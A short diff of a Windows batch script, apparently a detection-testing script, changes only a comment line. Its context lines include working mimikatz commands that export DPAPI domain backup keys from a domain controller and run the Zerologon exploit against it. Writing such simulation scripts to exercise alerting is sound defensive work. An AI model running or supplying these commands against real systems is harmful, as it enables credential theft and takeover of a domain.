@@ -87,7 +87,7 @@ rem **Malicious request of Data Protection API (DPAPI) master key
 mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:%mydc% /export"  "exit"
 TIMEOUT /T 120
 
-rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DCACCOUNT HERE> IT SHOULD BE IN THE P)
+rem **Suspected Netlogon privilege elevation attempt
 mimikatz.exe "privilege::debug" "lsadump::zerologon /target:%mydc% /account:dc1$ /exploit"  "exit"
 TIMEOUT /T 120
 
